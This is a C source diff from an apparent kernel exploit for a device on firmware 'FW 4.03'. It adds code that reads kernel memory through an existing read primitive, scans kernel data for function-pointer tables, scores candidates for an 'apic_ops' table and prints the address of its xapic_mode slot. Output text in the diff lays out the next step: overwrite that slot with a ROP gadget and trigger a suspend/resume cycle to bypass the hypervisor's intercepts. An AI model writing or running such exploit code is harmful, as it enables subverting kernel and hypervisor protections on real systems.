@@ -3680,6 +3680,11 @@ ring3_fallback:
                 uint64_t apic_best_addr = 0;
                 int apic_best_len = 0;
 
+                /* Track best apic_ops candidate: 26-30 entries, highest uniqueness */
+                uint64_t apic_ops_addr = 0;
+                int apic_ops_len = 0;
+                int apic_ops_unique = 0;  /* unique pointer count */
+
                 /* ── Direct check at known FW 4.03 offset first ── */
                 {
                     uint64_t known_kva = g_kdata_base + APIC_OPS_KNOWN_OFFSET;
@@ -3760,6 +3765,42 @@ ring3_fallback:
                                 apic_best_addr = apic_run_start;
                             }
                             apic_found_tables++;
+                            /* Dump entries for apic_ops-sized tables */
+                            if (apic_run_len >= 20 && apic_run_len <= 35) {
+                                uint64_t tbl_pa = va_to_pa_quiet(apic_run_start);
+                                if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
+                                    uint64_t tbl_buf[40];
+                                    int cnt = apic_run_len;
+                                    if (cnt > 40) cnt = 40;
+                                    kernel_copyout(g_dmap_base + tbl_pa,
+                                                   tbl_buf, cnt * 8);
+                                    int uniq = 0;
+                                    for (int u = 0; u < cnt; u++) {
+                                        int dup = 0;
+                                        for (int v = 0; v < u; v++) {
+                                            if (tbl_buf[v] == tbl_buf[u]) {
+                                                dup = 1; break;
+                                            }
+                                        }
+                                        if (!dup) uniq++;
+                                    }
+                                    printf("      -> %d/%d unique ptrs",
+                                           uniq, cnt);
+                                    if (cnt >= 26 && cnt <= 30 &&
+                                        uniq > apic_ops_unique) {
+                                        apic_ops_addr = apic_run_start;
+                                        apic_ops_len = cnt;
+                                        apic_ops_unique = uniq;
+                                        printf(" [BEST apic_ops candidate]");
+                                    }
+                                    printf("\n");
+                                    for (int di = 0; di < cnt; di++) {
+                                        printf("      [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                                               di, (unsigned long)tbl_buf[di],
+                                               (unsigned long)(tbl_buf[di] - g_ktext_base));
+                                    }
+                                }
+                            }
                         }
                         apic_run_len = 0;
                         continue;
@@ -3791,6 +3832,44 @@ ring3_fallback:
                                     apic_best_addr = apic_run_start;
                                 }
                                 apic_found_tables++;
+
+                                /* Dump entries for apic_ops-sized tables (20-35) */
+                                if (apic_run_len >= 20 && apic_run_len <= 35) {
+                                    uint64_t tbl_pa = va_to_pa_quiet(apic_run_start);
+                                    if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
+                                        uint64_t tbl_buf[40];
+                                        int cnt = apic_run_len;
+                                        if (cnt > 40) cnt = 40;
+                                        kernel_copyout(g_dmap_base + tbl_pa,
+                                                       tbl_buf, cnt * 8);
+                                        /* Count unique pointers */
+                                        int uniq = 0;
+                                        for (int u = 0; u < cnt; u++) {
+                                            int dup = 0;
+                                            for (int v = 0; v < u; v++) {
+                                                if (tbl_buf[v] == tbl_buf[u]) {
+                                                    dup = 1; break;
+                                                }
+                                            }
+                                            if (!dup) uniq++;
+                                        }
+                                        printf("      -> %d/%d unique ptrs",
+                                               uniq, cnt);
+                                        if (cnt >= 26 && cnt <= 30 &&
+                                            uniq > apic_ops_unique) {
+                                            apic_ops_addr = apic_run_start;
+                                            apic_ops_len = cnt;
+                                            apic_ops_unique = uniq;
+                                            printf(" [BEST apic_ops candidate]");
+                                        }
+                                        printf("\n");
+                                        for (int di = 0; di < cnt; di++) {
+                                            printf("      [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                                                   di, (unsigned long)tbl_buf[di],
+                                                   (unsigned long)(tbl_buf[di] - g_ktext_base));
+                                        }
+                                    }
+                                }
                             }
                             apic_run_len = 0;
                         }
@@ -3806,6 +3885,41 @@ ring3_fallback:
                         apic_best_addr = apic_run_start;
                     }
                     apic_found_tables++;
+                    /* Dump entries for apic_ops-sized tables */
+                    if (apic_run_len >= 20 && apic_run_len <= 35) {
+                        uint64_t tbl_pa = va_to_pa_quiet(apic_run_start);
+                        if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
+                            uint64_t tbl_buf[40];
+                            int cnt = apic_run_len;
+                            if (cnt > 40) cnt = 40;
+                            kernel_copyout(g_dmap_base + tbl_pa,
+                                           tbl_buf, cnt * 8);
+                            int uniq = 0;
+                            for (int u = 0; u < cnt; u++) {
+                                int dup = 0;
+                                for (int v = 0; v < u; v++) {
+                                    if (tbl_buf[v] == tbl_buf[u]) {
+                                        dup = 1; break;
+                                    }
+                                }
+                                if (!dup) uniq++;
+                            }
+                            printf("      -> %d/%d unique ptrs", uniq, cnt);
+                            if (cnt >= 26 && cnt <= 30 &&
+                                uniq > apic_ops_unique) {
+                                apic_ops_addr = apic_run_start;
+                                apic_ops_len = cnt;
+                                apic_ops_unique = uniq;
+                                printf(" [BEST apic_ops candidate]");
+                            }
+                            printf("\n");
+                            for (int di = 0; di < cnt; di++) {
+                                printf("      [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                                       di, (unsigned long)tbl_buf[di],
+                                       (unsigned long)(tbl_buf[di] - g_ktext_base));
+                            }
+                        }
+                    }
                 }
 
                 printf("\n[*] Found %d function pointer tables.\n",
@@ -3815,76 +3929,17 @@ ring3_fallback:
                     printf("[+] Largest table: kdata+0x%lx (%d entries)\n",
                            (unsigned long)(apic_best_addr - g_kdata_base),
                            apic_best_len);
-                    printf("[*] Dumping entries:\n");
-                    /* Dump the best candidate */
-                    uint64_t dump_pa = va_to_pa_quiet(apic_best_addr);
-                    if (dump_pa) {
-                        int dump_cnt = apic_best_len;
-                        if (dump_cnt > 40) dump_cnt = 40;
-                        uint64_t dump_buf[40];
-                        kernel_copyout(g_dmap_base + dump_pa,
-                                       dump_buf, dump_cnt * 8);
-                        for (int di = 0; di < dump_cnt; di++) {
-                            printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
-                                   di, (unsigned long)dump_buf[di],
-                                   (unsigned long)(dump_buf[di] - g_ktext_base));
-                        }
-                    }
                 }
 
-                /* Look specifically for tables with ~20-30 entries (apic_ops size) */
-                if (apic_found_tables > 0) {
-                    printf("\n[*] Candidate apic_ops tables (10-40 entries):\n");
-                    int apic_cand = 0;
-                    apic_run_len = 0;
-                    apic_run_start = 0;
-
-                    for (uint64_t off = 0; off < APIC_SCAN_SIZE;
-                         off += APIC_SCAN_CHUNK) {
-                        uint64_t scan_kva = g_kdata_base + off;
-                        uint64_t scan_pa = va_to_pa_quiet(scan_kva);
-                        if (scan_pa == 0) {
-                            if (apic_run_len >= 10 && apic_run_len <= 40) {
-                                printf("    CANDIDATE at kdata+0x%lx: %d ptrs\n",
-                                       (unsigned long)(apic_run_start - g_kdata_base),
-                                       apic_run_len);
-                                apic_cand++;
-                            }
-                            apic_run_len = 0;
-                            continue;
-                        }
-                        kernel_copyout(g_dmap_base + scan_pa, apic_chunk,
-                                       APIC_SCAN_CHUNK);
-                        for (int qi = 0; qi < APIC_SCAN_CHUNK; qi += 8) {
-                            uint64_t qval;
-                            memcpy(&qval, &apic_chunk[qi], 8);
-                            int is_ktext_ptr =
-                                (qval >= g_ktext_base &&
-                                 qval < g_ktext_base + 0xA00000 &&
-                                 (qval & 0xF) == 0);
-                            if (is_ktext_ptr) {
-                                if (apic_run_len == 0)
-                                    apic_run_start = scan_kva + qi;
-                                apic_run_len++;
-                            } else {
-                                if (apic_run_len >= 10 && apic_run_len <= 40) {
-                                    printf("    CANDIDATE at kdata+0x%lx: %d ptrs\n",
-                                           (unsigned long)(apic_run_start - g_kdata_base),
-                                           apic_run_len);
-                                    apic_cand++;
-                                }
-                                apic_run_len = 0;
-                            }
-                        }
-                    }
-                    if (apic_run_len >= 15 && apic_run_len <= 40) {
-                        printf("    CANDIDATE at kdata+0x%lx: %d ptrs\n",
-                               (unsigned long)(apic_run_start - g_kdata_base),
-                               apic_run_len);
-                        apic_cand++;
-                    }
-                    if (apic_cand == 0)
-                        printf("    (none in 15-40 range)\n");
+                /* Report best apic_ops candidate */
+                if (apic_ops_addr) {
+                    printf("[+] Best apic_ops candidate: kdata+0x%lx (%d entries, %d/%d unique)\n",
+                           (unsigned long)(apic_ops_addr - g_kdata_base),
+                           apic_ops_len, apic_ops_unique, apic_ops_len);
+                    printf("    xapic_mode slot [2] at kdata+0x%lx\n",
+                           (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
+                } else {
+                    printf("[!] No apic_ops candidate found (26-30 entries with high uniqueness)\n");
                 }
 
                 printf("\n");
@@ -3924,11 +3979,17 @@ ring3_fallback:
                 printf("    Overwrite apic_ops.xapic_mode (kdata+offset+0x10)\n");
                 printf("    with ROP gadget, trigger suspend/resume cycle.\n");
                 printf("    Code runs before HV restarts → bypass intercepts.\n");
-                if (apic_best_addr) {
-                    printf("[+] Candidate apic_ops found at 0x%lx\n",
-                           (unsigned long)apic_best_addr);
-                    printf("    xapic_mode would be at 0x%lx (offset +0x10)\n",
-                           (unsigned long)(apic_best_addr + 0x10));
+                if (apic_ops_addr) {
+                    printf("[+] apic_ops candidate at kdata+0x%lx (%d entries, %d unique)\n",
+                           (unsigned long)(apic_ops_addr - g_kdata_base),
+                           apic_ops_len, apic_ops_unique);
+                    printf("    xapic_mode [2] at 0x%lx (kdata+0x%lx)\n",
+                           (unsigned long)(apic_ops_addr + 0x10),
+                           (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
+                } else if (apic_best_addr) {
+                    printf("[?] No 26-30 entry match; largest table at kdata+0x%lx (%d entries)\n",
+                           (unsigned long)(apic_best_addr - g_kdata_base),
+                           apic_best_len);
                 }
                 printf("\n");
                 fflush(stdout);
